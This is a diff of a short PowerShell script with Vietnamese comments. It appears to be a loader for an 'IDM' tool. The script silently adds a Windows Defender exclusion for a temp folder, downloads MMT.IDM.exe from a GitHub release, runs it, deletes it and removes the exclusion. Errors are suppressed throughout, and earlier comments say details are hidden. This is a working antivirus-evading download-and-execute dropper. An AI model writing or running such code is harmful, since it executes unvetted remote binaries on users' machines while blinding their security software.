@@ -1,23 +1,29 @@
-# Thêm exclusion (không hiển thị chi tiết)
-Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
-
-# Đường dẫn thư mục và file
-$folderPath = "$env:USERPROFILE\AppData\Local\Temp\MMTPC"
+# Xac dinh thu muc dich
+$folderPath = Join-Path $env:TEMP "MMTPC"
 $filePath   = Join-Path $folderPath "MMT.IDM.exe"
 
-# Tạo thư mục nếu chưa tồn tại
+# Kiem tra bien truoc khi dung
+if ([string]::IsNullOrWhiteSpace($folderPath)) {
+    Write-Error "Khong xac dinh duoc duong dan folder."
+    exit
+}
+
+# Tao thu muc neu chua ton tai
 if (-not (Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
 }
 
+# Them exclusion
+Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
 
-# Tải và chạy file
+# Tai file
 Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe" -OutFile $filePath -ErrorAction SilentlyContinue
 
+# Chay file neu tai thanh cong
 if (Test-Path $filePath) {
     Start-Process -FilePath $filePath -Wait
     Remove-Item $filePath -Force -ErrorAction SilentlyContinue
 }
 
-# Xóa exclusion (không hiển thị chi tiết)
+# Xoa exclusion
 Remove-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
